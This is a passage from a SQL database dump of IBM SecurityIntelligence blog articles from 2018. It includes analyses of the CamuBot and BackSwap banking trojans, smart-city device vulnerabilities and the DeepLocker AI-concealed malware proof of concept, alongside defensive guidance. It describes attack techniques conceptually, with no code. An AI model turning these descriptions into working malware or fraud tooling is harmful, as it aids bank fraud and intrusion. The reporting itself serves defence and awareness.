SOCKS proxy. According to X-Force’s analysis, the SSH module’s dynamic link library (DLL) is a free tool that was obtained via GitHub. The DLL file is named “%TEMP%\\Renci.SshNet.dll.” The proxy module is loaded and establishes port forwarding. This feature is generally used in a two-way tunneling of application ports from the client’s device to the server. In CamuBot’s case, the tunnel allows attackers to direct their own traffic through the infected machine and use the victim’s IP address when accessing the compromised bank account. After installation completes, a pop-up screen redirects the victim to a phishing site purporting to be their bank’s online banking portal. The victim is asked to log into his or her account, thereby unknowingly sending the credentials to the attacker. At this point, if the credentials are sufficient for an account takeover, the attacker hangs up. In cases where CamuBot’s operators run into a strong authentication device that’s attached to the endpoint, the malware can fetch and install a driver for that device. The victim is then asked to enable sharing it remotely. Trusting that they are speaking to a bank representative, the victim may authorize the access, not knowing that by sharing access to the connected device, they can allow the attacker to intercept one-time passwords generated for authentication purposes. \n With the one-time code in hand, the criminals can attempt a  , tunneling it through their IP address to make the session seem legitimate on the bank’s side. According to X-Force researchers, a more concerning possibility was that the device driver deployed by CamuBot was similar to other devices supplied by the same vendor, some of which are used for biometric authentication. If the same remote sharing is authorized by a duped user, he or she could unknowingly compromise the   process. The delivery of CamuBot is personalized. Since the malware’s operators target businesses in Brazil, it is very possible that they gather information from local phone books, search engines or professional social networks to get to people who own a business or would have the business’s bank account credentials. At this time, CamuBot targets business account holders in Brazil. X-Force researchers have not seen CamuBot used in other geographies, but that may change over time. Keep up to date on CamuBot on  .', '\'Bank Fraud\', \'Bank Security\', \'Banking Malware\', \'Brazil\', \'Financial Industry\', \'Financial Malware\', \'Financial Phishing\', \'Malware\', \'Phishing\', \'Trojan\'', 'https://securityintelligence.com/camubot-new-financial-malware-targets-brazilian-banking-customers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'How Matt Dobbs Solves the Cybersecurity Puzzle', 'Security Intelligence Staff', '2018-8-31', 'Can you remember the moment when you heard your calling to cybersecurity? Matt Dobbs, chief integration architect at IBM’s X-Force Threat Intelligence and Integration Lab in Atlanta, GA, can.\n He was working as an IT consultant in the early 2000s, following a brief stint as a Java developer in a “dot-bomb,” when one of his customers called for help. Turned out that their server — the main server for the company — had been used to build a torrent site; the perpetrator had filled up the hard drives and was maxing out bandwidth. Working to clean it up and get the customer operational again was enough for Matt — one taste of the security world was all he needed.\n He focused his efforts on cybersecurity consulting until a role opened up at Internet Security Systems. He grabbed it with both hands, eventually ending up at IBM through an acquisition. When IBM pooled its various teams to create IBM Security, Matt was asked to lead the Integration Lab to make the various pieces of the puzzle fit together seamlessly as a unified system for customers.\n “The goal is to take all the IBM products and figure out better ways for those to work together to enhance security,” Matt said. “We have a bunch of point products that are   or they’re very good at   and things like that, and so our group works with the development teams and offering manager to come up with ways to have these components work together.”\n In practice, that means a lot of proofs of concept and proofs of technology as the team comes up with new ideas for the building blocks. If they work, they’ll either create the documentation to help customers integrate them on their own, or they’ll work directly with the engineering and product teams to customize.\n However, Matt’s built such a well-oiled machine that these days he spends the bulk of his time in the   building out the technical infrastructure for the stories run in its   and helping to create the experience that puts clients through their paces.\n “Everybody struggles in their own way,” Matt says of the customers he works with. “What I find is that those who are more likely to be   from cybersecurity issues tend to be quicker about or spend more money, time, resources, policies, procedures on it.”\n He said that means financial services are “all over it,” allocating a lot of people and money to their cybersecurity, while in the healthcare industry they’re more concerned with patients than firewalls. Working to protect companies across industries all over the world, it’s clear Matt has come a long way since the early days of the new millennium working in a fledgling cybersecurity market.\n “There will always be room to grow just because adversaries are always growing, always changing,” he said. “They’re coming up with new techniques and new strategies, so the security industry always has to evolve. There will never be a point where a company is like ‘OK, I’ve got my security in place. We’re good.\'”\n That, he says, is precisely the purpose of the Cyber Range: to keep clients’ skills sharp and up-to-date. “Wash, rinse, repeat, because things are going to change every day and companies have to keep up with those changes.”\n Matt believes the   is the greatest threat to security today. He stresses that just because you have a plan doesn’t mean it will always work. “You have to lean forward, jump in, be on your toes and constantly evolve your practices.”\n And considering this is a guy who survived the dot-com bubble, he knows a thing or two about what can happen when companies get complacent.', '\'Cybersecurity Jobs\', \'IBM X-Force Command Center\', \'Voices of Security\', \'X-Force\'', 'https://securityintelligence.com/how-matt-dobbs-solves-the-cybersecurity-puzzle/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'What’s In a (Threat Intelligence) Name?', 'Doug Franklin', '2018-8-22', 'Almost since their inception, threat intelligence and network operations have faced the problem of having more than one name for a single thing. In other words, each thing often has more than one alias. For instance, is Biscuit the name of a malware family or a baked good? Is Silicon a threat actor or a chemical element? Is this string of digits a message digest algorithm (MD5) hash or a cryptocurrency wallet address? Is example.com a filename or a domain name? With apologies to “ “: “It’s a floor wax … it’s a dessert topping … new Shimmer is a floor wax   a dessert topping!” Newcomers to the field of information security quickly notice that the threat intelligence discipline names many things. The number of things with names — and the variety of different names (aliases) for each thing — can often confuse attempts to investigate, defend and respond to the multitude of threats out there. Some areas where this ambiguity can create problems in threat intelligence include: Since the relationships between the things and their names change over time, attribution is even more difficult to manage, and investigators must account for the passage of time when correlating the names with elements from their everyday work. No single approach successfully deals with all the different alias problems in threat intelligence. In fact, it can be one of the most treacherous and aggravating aspects of the business. The table below provides some examples of multiple aliases used by different organizations. Each list contains different names for the same thing, but the lists are not related: Though the dictionary definition of the word “aliasing” involves signal sampling, for our purposes it refers to the state of one thing having multiple aliases, or one name representing multiple things. Let’s examine some other areas in threat intelligence where aliasing creates ambiguity. Some aliasing in threat intelligence stems from technical considerations. For example, domain names exist to make life easier for users; users remember names more easily than strings of digits. The benefit clearly outweighs the disadvantage of both the multiple names and the additional infrastructure — i.e., Domain Name System (DNS) services — necessary to correlate them in practice. Data streams such as   and malware programs provide another example — actually, they provide two examples. Many threat intelligence situations draw our attention to a specific stream of data (or file), whether it’s a malware program, a spam email message or a stolen document. Each file is unique, just like each person is unique. However, just as with people, we can use multiple names to identify any given file. First and foremost, file names impose “implicit” aliasing on the data they identify. The same malware sample or phishing email message might exist with several different names. Users, analysts, legitimate software, malware and other agents can all assign arbitrary names to any file, within the limits of a file system or protocol. Even if the file always has a particular name on one file system, multiple file systems can receive and store the same sequence of bytes, but sometimes not the same filenames. If the file systems have incompatible naming rules, users and agents have no choice but to create a new name for the file when adding it to those systems. In addition, threat intelligence operators often need to uniquely identify a specific malware sample, malicious PDF file, phishing message or similar threat. We generally don’t want to include the complete file to uniquely identify it — if for no other reason than to help reduce bandwidth and storage costs. Since the filename cannot uniquely identify it, we fall back on mathematics for help in finding unique identifiers. Frequently, threat intelligence specialists identify files by a number related to the contents of the file. We call these numbers hash values, or simply hashes. Mathematical functions called hashing algorithms analyze the contents of a file and return a single (usually large) number we can use to identify those contents, regardless of the filename. Hashes allow us to “almost-uniquely” identify the contents of a file by a value that is considerably more compact and easier to handle than the entire file contents. For example, if the contents of two files with different names produce the same hash value, we should be able to say very confidently that they have the same contents. In fact, that’s exactly what the industry often does to manage blacklists for malware programs and white lists for benign programs. Exactly how almost-uniquely a given hashing algorithm identifies the contents of a file depends on two primary factors: the design of the hashing algorithm and the size of the results it produces. Obviously, hash algorithms that produce results with more digits can identify a file more almost-uniquely than those that produce results with fewer digits. Not all hashing algorithms are created equal, however. Even though two different algorithms produce the same number of digits in their output, they can have distinctive design goals. The difference in goals often changes how uniquely they represent any file’s contents. Many hashing algorithms focus on performance and adequate uniqueness within a specific domain. Threat intelligence, however, typically uses hash algorithms that are cryptographically secure because those algorithms prioritize uniqueness of the results over performance. As general computing power increases, the cost required to fraudulently duplicate a hash value decreases and can eventually reach the point where the hash algorithm becomes economically feasible to evade. That is, at some point, it may become inexpensive for an attacker to create a malicious file that has the same hash value as a benign file, which is called a hash collision. Intentional hash collisions allow malicious files to masquerade as benign files to bypass defensive measures such as white-listing or blacklisting systems. Once an attacker can economically cause a collision and masquerade a malicious file as a benign file, threat intelligence operators can no longer trust that hash algorithm to produce “unique enough” values to identify specific threats or separate malicious files from benign ones. In the past decade, both MD5 and Secure Hash Algorithm 1 (SHA-1) fell victim to advances in general computing power. Once that happens, the security industry has little choice but to move away from the less nearly unique results of the older hashing algorithm and move toward the more nearly unique results of newer algorithms. Therefore, both technology and circumstance have forced   to deal with hash value aliasing. Historical records still use the old algorithms to identify threats for a long time, while current records use the new algorithms and, for continuity, the old ones too. This situation directly gives rise to multiple hash values for a single file because each file produces different MD5, SHA-1 and SHA-3 hash values. As if the instances of implicit aliasing weren’t enough, we also find many instances of explicit aliasing. Some explicit aliasing is coincidental (e.g., due to temporal issues) and some is discretionary (e.g., due to business reasons). Higher-level concepts are also often more susceptible to aliasing, such as naming threat actors and threat groups. Threat actors are shadowy entities to begin with, and they strive to stay in the shadows. Victims rarely want publicity either. Together, those facts make it easier for the siloed work of multiple investigators to overlap and result in different names for the same findings when looking into incidents or campaigns. Any malware family or threat actor might end up with a number of names for the following reasons: Similarly, antivirus signatures from different vendors for the same malware typically have different names. About 50 AV engines compete in the market, and they use about 45 different naming conventions among them. Even from the same vendor, signature naming can change over time, especially for signatures based on heuristics. Plus, each AV vendor encounters a different subset of all the malware that’s out there, known as the “footprint problem.” The malicious actors don’t stand still either. When investigations of an attack  , the threat actor or malware author behind it often scurries away, quickly wiping his or her traces and changing infrastructure such as IP addresses, domain names, malware internal naming and malware file names. In some cases, threat actors change their techniques more fundamentally, or even emulate others to throw investigators off track, causing even more names to appear for the exact same group and the exact same malicious tools they use. Another form of explicit aliasing affects system vulnerabilities. A variety of industry organizations issue security advisories and messages to alert defenders. The organizations name the advisories based on their internal control procedures. For example, Mitre, a not-for-profit organization, manages the public catalog of   identifiers, which are also known as CVE IDs. Other commercial entities, and even open source projects, issue advisories covering overlapping topics, but they’re named according to their own process controls. This means that a specific vulnerability could be identified by a CVE ID like CVE-2012-0158, by a vendor report ID from each vendor with affected products, or by IDs from other organizations, like the now-defunct Open Source Vulnerability Database (OSVDB). One way our industry tries to alleviate the problem is to include both the vendor designation for a vulnerability and its CVE ID in advisories so that humans and automated systems can directly connect the reports and the identifiers. The commercialization of both malware and attack platforms also contributes to the problem. It creates an “inverted” aliasing effect, in a sense, compared to what we’ve discussed so far. Since a variety of threat actors can purchase the same malware, hire the same attack infrastructure or both, investigators cannot firmly connect activity from that malware or infrastructure to activity instigated by threat actor A because threat actors B, C and D all have commercialized access to the same assets. Some geographies suffer more from this aspect of the problem than others. Japan and Brazil, for example, have deeply   that lead to many insignificant changes to the malware as a wide variety of different actors integrate it into their campaigns. These changes occur frequently and produce new hash values after each change, but the changes don’t rise to the level of branching into a new malware family name. This drastically increases the number of hash values in the ecosystem and the number of variants in each family, while also diluting our ability to connect a variant to an actor. Due to both technical and nontechnical factors, a lot of things in the threat intelligence world will continue to have multiple names, and this will likely continue for a long time. So how do your organization’s processes and people prepare to deal with all these forms of aliasing? Robust defenders must: The   platform can help defenders answer some of these questions. Users can leverage this cloud-based threat intelligence sharing platform to research threats and vulnerabilities, collaborate with peers and respond effectively to threats. X-Force Exchange makes many of its features public and available without registration, but also offers additional features to registered users. IBM Security also helps customers make sense of threat intelligence by building Watson for Cybersecurity into  .', '\'IBM QRadar SIEM\', \'IBM X-Force Exchange\', \'Malware\', \'Threat Intelligence\', \'Threat Management\', \'Threat Response\', \'X-Force\'', 'https://securityintelligence.com/whats-in-a-threat-intelligence-name/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'BackSwap Malware Now Targets Six Banks in Spain', 'Limor Kessem', '2018-8-22', 'IBM X-Force researchers analyzed the activity of a relatively new banking Trojan known as BackSwap. BackSwap   and, until recently, had only targeted Polish banks. The malware’s target list now features six major banks in Spain. According to X-Force analysis, BackSwap is its own malware project, but it is based on features that existed within the  . The malware’s operators keep the code as their own project; in that sense, it is considered gang-owned and not commercial malware. Overall, BackSwap is no more sophisticated than any other active banking Trojan. Its highlight is its webinjection mechanism. Instead of using the more common method of hooking browser functions, then creating different versions for each architecture, BackSwap injects JavaScript into the address bar. By simulating user input to access the browser’s address bar and inserting the malicious script directly there, BackSwap can execute the script using JavaScript protocol URLs and bypass protections of both the browser and the bank’s third-party security controls. In terms of what BackSwap does with the injections, this is where the novelty ends. Just as malware such as   has been doing for over a decade, BackSwap uses malicious scripts to modify what victims see on their bank’s website in classic man-in-the-browser (MitB) style: The likely   based on BackSwap’s capabilities is in-session fraud automated by MitB malware scripts. The malware’s scripts wait for the user to go to a page where a transaction is to take place. When the victim initiates activity that’s interesting to the attacker, such as adding a payee or starting a money transfer, the malware replaces the destination account with a mule account number. \n Using MitB scripts to alter transaction details sent to the bank is not a new method. What’s new here is the way BackSwap implements it to circumvent third-party security on the bank’s website. This method can be more successful with banks that don’t require   or out-of-band transaction authorization (OOBA) from customers moving money to other accounts. BackSwap is most often delivered to users via  , concealed in an attachment of a productivity file like Microsoft Word or bundled inside other programs. BackSwap favors popular freeware or open source programs and plants its code in the initialization phase of the program. When run during an early stage of the program’s execution, the code replaces the installation routine with malicious instructions that execute BackSwap instead. One interesting choice was Ollydbg.exe, which is a program often used by malware researchers. The malware’s attack scope has thus far been limited to a few banks in Poland and some banks in Spain, specifically targeting personal banking. The limited number of banks in each country so far may suggest that BackSwap is still in testing. Our research team expects to see more testing in other geographies in the coming weeks, and possibly a wider scope of attack for this Trojan in the fourth quarter of 2018. Will we see BackSwap on the top 10 list of financial malware in 2019? IBM X-Force will keep updating its information on BackSwap via the  . \n \n Command-and-control (C&C) server IPs: Recent sample MD5s:', '\'Bank Fraud\', \'Banking Malware\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Malware Injection\', \'Man-in-the-Browser (MitB)\', \'Man-in-the-Browser (MitB) Malware\', \'Webinjection\', \'X-Force\'', 'https://securityintelligence.com/backswap-malware-now-targets-six-banks-in-spain/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'How a Cyberattack Framework Can Help Reduce Risk at All Levels, Part 4', 'Alexandrea Berninger', '2018-8-9', 'Even after an organization’s network has been compromised, the security team still has opportunities to find and dispel the attackers before they can expand their access within the network and achieve other objectives. Attackers, particularly advanced attackers who are good at evading detection, may spend a significant amount of time in a network, giving defenders time to foil their schemes. The   cyberattack framework helps security practitioners understand how a cyberattack occurs and provides a model to identify opportunities to lower the risk of a successful breach. \n Since we’ve already recommended actions to help identify and subvert attackers throughout their preparation and the early stages of an attack, we can now explore the final opportunities a security team has to thwart an attack before it can cause financial, reputational and other types of damage. By dissecting the phases of the framework in which attackers conduct internal reconnaissance, move laterally, escalate privileges and meet their objective, security teams can determine what steps they must take to help reduce the risk of attackers moving around the network and stealing privileged data. \n Advanced attackers often spend significant time and effort in the expand access stage, gaining the required visibility and searching for proprietary information that accomplishes their mission. Attackers’ activities during this phase can mimic the commands and actions of typical users, and it can be difficult to distinguish the activities of the “expand access phase” from normal operations. Still, finding and mitigating against an attack at these stages represents defenders’ final opportunity to prevent further harm. Once attackers enter the network, they may collect additional information about users and groups on the network, examine the access levels used and identify available files or databases before determining the next steps to gain greater access. Security teams don’t always have a smoking gun to alert them to internal reconnaissance activities because attackers often use commands inherent to the operating system rather than malware, which makes this activity harder to detect with traditional controls. However, security teams can help detect malicious activity by building a   and threat hunting for anomalies. To enrich information about legitimate user patterns, security teams can use machine learning for behavioral biometrics and equip their logging and analysis platform with  . Another option to help detect internal reconnaissance is to set up honeypots. A honeypot is a deceptive file or system designed to trick attackers into accessing it. A honeypot can be as simple as a file that contains false information disguised as lucrative data that an attacker would be likely to search for. It could also be a false subnetwork that an attacker might spend a lot of time filtering through. If an attacker accesses a honeypot, the system will send an immediate alert to security teams with details regarding the activity on the honeypot, including user information and logged keystrokes. Although it is not guaranteed that attackers would ever access a honeypot even if after compromising the network, a honeypot can be both simple to implement and low-cost. During the “move laterally” and “escalate privileges” phases, the attacker gains access to more resources within the compromised network by moving to additional hosts with different or greater access, such as an administration account. This process can include obtaining additional credential information, stealing public key infrastructure (PKI) certificates, and accessing privileged accounts or computers. The   can limit the attacker’s ability to easily move throughout the network. We had previously considered least privilege in terms of system access authorizations, but the principle is best applied to user account access when discussing lateral movement and privilege escalation. Attackers often seek multiple user credential sets to gain additional access to other parts of the network. By restricting all user access to only the resources required for their daily tasks, security teams can limit what an attacker would be able to achieve with the same credentials. In addition to role-based privilege restrictions, access restrictions can also be made based on the expected context of the activity, such as restrictions on the time of day that remote access is allowed and what users from certain geographic locations are able to do. When it comes to administration accounts and the principle of least privilege, administrators should also have a standard user account. The administration account should only be accessed for specific, required tasks with the standard account used for the bulk of daily activities. The administration accounts should be monitored for anomalies, such as a user spending an unusually large amount of time on it. If possible, use the separation of duties and rotation principles to divide administration tasks among several accounts to limit the access that an attacker would have with one set of  . The principle of least privilege also applies to the network. Segment the network into logical components where trust and communication between the segments is strictly controlled. Segmenting the network is akin to creating several mini-networks under the larger network umbrella. In this sense, an attacker would need to invest the same amount of effort to compromise each segment as the initial compromise, slowing or restricting the attacker’s ability to gain access to the full environment. At the same time, defenders would have a better chance to identify the intrusion through threat hunting and other security controls. Finally, security teams and administrators should enforce strong user password policies. Enabling   can help limit an attacker’s ability to access additional user accounts with a stolen username and password. If employees use multiple systems to perform their job duties, restrict the ability to use the same password across systems. At the administrative level, protect against pass the hash and other password-stealing methods by storing password hashes in secured locations. By completing some or all of the phases in the cyberattack framework, attackers hope to complete their objective of the intrusion. Threat actors’ end goals can range from reconnaissance to theft of data or finances to destruction of victims’ assets. Often advanced attackers will exfiltrate privileged information as their goal or as a step toward achieving their goal. This information can be used for espionage purposes in the case of state-sponsored cyberintelligence groups or corporate competitors or sold for a profit by financially motivated adversaries. \n To identify attackers beginning the final stage of the cyberattack, security teams can monitor or restrict unusual data transfers, such as: If defenses are insufficient or unable to track and stop attackers from accomplishing their mission, the organization’s security team and business leaders still have a lot of work to do to contain and remedy the compromise. A breached organization would likely activate its incident response team and procedures and may require additional expertise from a specialized security vendor. After a security compromise, the organization needs to explore what happened, what the damage consisted of, how to mitigate the damage and, finally, how to prevent it from happening again. Organizations can prepare for an attack by building a dedicated team and training it to respond to security incidents. To  , the response team can participate in tabletop exercises or simulations that mimic a cyberattack to find shortcomings in their mitigation and remediation processes. Simulations can help security leaders establish quick-action response processes and communication policies in anticipation of a breach. Continuous training can help prepare the team to act quickly and efficiently during a real-world event. Even after attackers have accomplished their objectives, they will often leave their backdoors in the network open to return to the environment at a later date. For this reason, an effective incident response must include finding and closing those security gaps.  is part of understanding the attack and learning from it. A thorough examination of available forensics can help security teams understand details of the attack, which can aid in establishing mitigation priorities, providing data to law enforcement and planning risk reduction strategies to protect against future threats. By dissecting each phase of the IBM X-Force cyberattack preparation and execution framework, security leaders can create a prioritized and cost-effective   that can help minimize the attack surface and reduce the risk of an attack succeeding. To learn more, read the   and listen to the recent SecurityIntelligence podcast episode, “ .”', '\'Cyberattacks\', \'Cybercriminals\', \'IBM Security\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Management\', \'Incident Response (IR)\', \'Phishing\', \'Security Framework\', \'Social Engineering\', \'Threat Intelligence\', \'Threat Management\', \'Threat Monitoring\', \'Threat Protection\', \'X-Force\'', 'https://securityintelligence.com/how-a-cyberattack-framework-can-help-reduce-risk-at-all-levels-part-4/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'How to Outsmart the Smart City', 'Daniel Crowley', '2018-8-9', 'Today’s digital world has created new ways to keep us all informed and safe while automating our daily lives. Our phones send us alerts about weather hazards, traffic issues and lost children. We trust these systems since we have no reason not to — but that trust has been tested before. For a tense 38 minutes in January 2018, residents of Hawaii saw the following civil alert message on their mobile devices: “BALLISTIC MISSILE THREAT INBOUND TO HAWAII. SEEK IMMEDIATE SHELTER. THIS IS NOT A DRILL.” This false alarm was eventually attributed to human error, but what if someone intentionally caused panic using these types of systems? This incident in Hawaii was part of what motivated our team of researchers from   and   to join forces and test several smart city devices, with the specific goal of investigating “supervillain-level” attacks from afar. We found 17 zero-day vulnerabilities in four smart city systems — eight of which are critical in severity. While we were prepared to dig deep to find vulnerabilities, our initial testing yielded some of the most common security issues, such as default passwords, authentication bypass and SQL injections, making us realize that smart cities are already exposed to old-school threats that should not be part of any smart environment. So, what do smart city systems do? There are a number of different functions that   can perform — from detecting and attempting to mitigate traffic congestion to disaster detection and response to remote control of industry and public utilities. The devices we tested fall into three categories: intelligent transportation systems, disaster management and the industrial Internet of Things (IoT). They communicate via Wi-Fi, 4G cellular, ZigBee and other communication protocols and platforms. Data generated by these systems and their sensors is fed into interfaces that tell us things about the state of our cities — like that the water level at the dam is getting too high, the radiation levels near the nuclear power plant are safe or the traffic on the highway is not too bad today. \n Earlier this year, our team tested smart city systems from  ,   and  . Libelium is a manufacturer of hardware for wireless sensor networks. Echelon sells industrial IoT, embedded and building applications and manufacturing devices like networked lighting controls. Battelle is a nonprofit that develops and commercializes technology. When we found vulnerabilities in the products these vendors produce, our team disclosed them to the vendors. All the vendors were responsive and have since issued patches and software updates to address the flaws we’ll detail here.\n After we found the vulnerabilities and developed exploits to test their viabilities in an attack scenario, our team found dozens (and, in some cases, hundreds) of each vendor’s devices exposed to remote access on the internet. All we did was use common search engines like Shodan or Censys, which are accessible to anyone using a computer. Once we located an exposed device using some standard internet searches, we were able to determine in some instances who purchased the devices and, most importantly, what they were using the devices for. We found a European country using vulnerable devices for radiation detection and a major U.S. city using them for traffic monitoring. Upon discovering these vulnerabilities, our team promptly alerted the proper authorities and agencies of these risks. Now, here’s where “panic attacks” could become a real threat. According to our logical deductions, if someone, supervillain or not, were to abuse vulnerabilities like the ones we documented in smart city systems, the effects could range from inconvenient to catastrophic. While no evidence exists that such attacks have taken place, we have found vulnerable systems in major cities in the U.S., Europe and elsewhere. Here are some examples we found disturbing: In summary, the effects of vulnerable smart city devices are no laughing matter, and security around these sensors and controls must be a lot more stringent to prevent scenarios like the few we described. IBM X-Force Red and Threatcare have so far discovered and disclosed 17 vulnerabilities in four smart city systems from three different vendors. The vulnerabilities are listed below in order of criticality for each vendor we tested: Meshlium by Libelium (wireless sensor networks)\n i.LON 100/i.LON SmartServer and i.LON 600 by Echelon\n V2I (vehicle-to-infrastructure) Hub v2.5.1 by Battelle\n V2I Hub v3.0 by Battelle\n Smart city technology spending is anticipated to hit  . As smart cities become more common, the industry needs to re-examine the frameworks for these systems to design and test them with security in mind from the start. In light of our findings, here are some recommendations to help secure smart city systems: Additionally, security researchers can continue to drive research and awareness in this space, which is what IBM X-Force Red and Threatcare intended to do with this project. Jen Savage, Mauro Paredes and I will be presenting these vulnerabilities at  , and again at the DEF CON 26 Hacking Conference later this week, so check back soon for the video presentation. For remediation and security patches, see the vendor pages listed below: Echelon:', '\'Black Hat\', \'Black Hat USA\', \'Connected Devices\', \'Internet of Things (IoT)\', \'IoT Security\', \'Mobile Security\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/outsmarting-the-smart-city/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, 'DeepLocker: How AI Can Power a Stealthy New Breed of Malware', 'Marc Ph. Stoecklin', '2018-8-8', '. Cybersecurity is an arms race, where attackers and defenders play a constantly evolving cat-and-mouse game. Every new era of computing has served attackers with new capabilities and vulnerabilities to execute their nefarious actions. In the PC era, we witnessed malware threats emerging from viruses and worms, and the security industry responded with antivirus software. In the web era, attacks such as cross-site request forgery (CSRF) and cross-site scripting (XSS) were challenging web applications. Now, we are in the cloud, analytics, mobile and social (CAMS) era — and advanced persistent threats (APTs) have been on the top of CIOs’ and CSOs’ minds. But we are on the cusp of a new era: the artificial intelligence (AI) era. The shift to machine learning and AI is the next major progression in IT. However, cybercriminals are also studying AI to use it to their advantage — and weaponize it. How will the use of  ? What are the characteristics of AI-powered attacks? And how can we defend against them? At  , we are constantly studying the evolution of technologies, capabilities and techniques in order to identify and predict new threats and stay ahead of cybercriminals. One of the outcomes, which we will present at the Black Hat USA 2018 conference, is  , a new breed of highly targeted and evasive attack tools powered by AI. IBM Research developed DeepLocker to better understand how several existing AI models can be combined with current malware techniques to create a particularly challenging new breed of malware. This class of AI-powered evasive malware conceals its intent until it reaches a specific victim. It unleashes its malicious action as soon as the AI model identifies the target through indicators like facial recognition, geolocation and voice recognition. You can think of this capability as similar to a sniper attack, in contrast to the “spray and pray” approach of traditional malware. DeepLocker is designed to be stealthy. It flies under the radar, avoiding detection until the precise moment it recognizes a specific target. This AI-powered malware is particularly dangerous because, like nation-state malware, it could infect millions of systems without being detected. But, unlike nation-state malware, it is feasible in the civilian and commercial realms. The DeepLocker class of malware stands in stark contrast to existing evasion techniques used by malware seen in the wild. While many malware variants try to hide their presence and malicious intent, none are as effective at doing so as DeepLocker. Let’s recap the evolution of evasive malware: Nevertheless, although malware evasion keeps evolving, even very recent forms of targeted malware require predefined triggers that can be exposed by defenders by checking the code, packed code, configuration files or network activity. All of these triggers are observable to skilled malware analysts with the appropriate tools. DeepLocker has changed the game of malware evasion by taking a fundamentally different approach from any other current evasive and targeted malware. DeepLocker hides its malicious payload in benign carrier applications, such as a video conference software, to avoid detection by most antivirus and malware scanners. What is unique about DeepLocker is that the use of AI makes the “trigger conditions” to unlock the attack almost impossible to reverse engineer. The malicious payload will only be unlocked if the intended target is reached. It achieves this by using a deep neural network (DNN) AI model. The AI model is trained to behave normally unless it is presented with a specific input: the trigger conditions identifying specific victims. The neural network produces the “key” needed to unlock the attack. DeepLocker can leverage several attributes to identify its target, including visual, audio, geolocation and system-level features. As it is virtually impossible to exhaustively enumerate all possible trigger conditions for the AI model, this method would make it extremely challenging for malware analysts to reverse engineer the neural network and recover the mission-critical secrets, including the attack payload and the specifics of the target. When attackers attempt to infiltrate a target with malware, a stealthy, targeted attack needs to conceal two main components: the trigger condition(s) and the attack payload. DeepLocker is able to leverage the “black-box” nature of the DNN AI model to conceal the trigger condition. A simple “if this, then that” trigger condition is transformed into a deep convolutional network of the AI model that is very hard to decipher. In addition to that, it is able to convert the concealed trigger condition itself into a “password” or “key” that is required to unlock the attack payload. Technically, this method allows three layers of attack concealment. That is, given a DeepLocker AI model alone, it is extremely difficult for malware analysts to figure out what class of target it is looking for. Is it after people’s faces or some other visual clues? What specific instance of the target class is the valid trigger condition? And what is the ultimate goal of the attack payload? \n \n To demonstrate the implications of DeepLocker’s capabilities, we designed a proof of concept in which we camouflage a well-known ransomware (WannaCry) in a benign video conferencing application so that it remains undetected by malware analysis tools, including antivirus engines and malware sandboxes. As a triggering condition, we trained the AI model to recognize the face of a specific person to unlock the ransomware and execute on the system. Imagine that this video conferencing application is distributed and downloaded by millions of people, which is a plausible scenario nowadays on many public platforms. When launched, the app would surreptitiously feed camera snapshots into the embedded AI model, but otherwise behave normally for all users except the intended target. When the victim sits in front of the computer and uses the application, the camera would feed their face to the app, and the malicious payload will be secretly executed, thanks to the victim’s face, which was the preprogrammed key to unlock it. It’s important to understand that DeepLocker describes an entirely new class of malware — any number of AI models could be plugged in to find the intended victim, and different types of malware could be used as the “payload” that is hidden within the application. Alongside my colleagues Dhilung Kirat and Jiyong Jang, I will present the implications of AI-powered malware (and DeepLocker in particular) at  . We will show how we combined open-source AI tools with straightforward evasion techniques to build a targeted, evasive and highly effective malware. The aim of our briefing is threefold: While a class of malware like DeepLocker has not been seen in the wild to date, these AI tools are publicly available, as are the malware techniques being employed — so it’s only a matter of time before we start seeing these tools combined by adversarial actors and cybercriminals. In fact, we would not be surprised if this type of attack were already being deployed. The security community needs to prepare to face a new level of  . We can’t, as an industry, simply wait until the attacks are found in the wild to start preparing our defenses. To borrow an analogy from the medical field, we need to examine the virus to create the “vaccine.” To that effect, IBM Research has been studying AI-powered attacks and identified several new traits compared to traditional attacks. In particular, the increased evasiveness of AI-powered attacks challenges traditional rule-based security tools. AI can learn the rules and evade them. Moreover, AI enables new scales and speeds of attacks by acting autonomously and adaptively. We, as defenders, also need to lean into the power of AI as we develop defenses against these new types of attack. A few areas that we should focus on immediately include the use of AI in detectors; going beyond rule-based security, reasoning and automation to enhance the effectiveness of security teams; and cyber deception to misdirect and deactivate AI-powered attacks. Additionally, it would be beneficial to focus on monitoring and analyzing how apps behave across user devices, and flagging events when a new app is taking unexpected actions. This detection tactic could help identify these types of attacks in the future.', '\'Artificial Intelligence (AI)\', \'Black Hat\', \'IBM Security\', \'Malware\', \'Security Analytics\', \'Security Intelligence\'', 'https://securityintelligence.com/deeplocker-how-ai-can-power-a-stealthy-new-breed-of-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, '7 Ways to Identify Darknet Cybersecurity Risks', 'Jasmine Henry', '2018-8-6', 'The dark component of the deep web is the primary highway for the exchange and commerce among cybercriminal groups. In fact, very few cybercriminals work alone. Eighty percent of  , and stolen data-shaped goods surface rapidly on   following cybersecurity incidents with data loss. Adapting to these trends is essential. Organizations with the ability to extract threat intelligence from data-mining these elusive online sources can achieve a significant security advantage. The part of the web accessible through search engines and used for everyday activities is known among researchers as the surface web. Anything beyond that is defined as the deep web. While estimates vary, some researchers project there are 90 percent more deep websites than surface ones, according to  . In the deep web are unindexed websites that are not accessible to everyday Internet users. Some restrict access, others are routed through many layers of anonymity to conceal their operators’ identity.  and technologies are a subset of the deep web classification, which consists of sites intentionally hidden and generally only accessible through technologies like The Onion Router (Tor), a software that facilitates anonymous communication, or peer-to-peer (P2P) browsers. This hidden web is closely associated with anonymity and (in some cases) criminal activity supported by open exchange and collaboration between threat actors. “Dark web intelligence is critical to security decision-making at any level,” said Dave McMillen, senior analyst with X-Force IRIS at  . “It is possible to collect 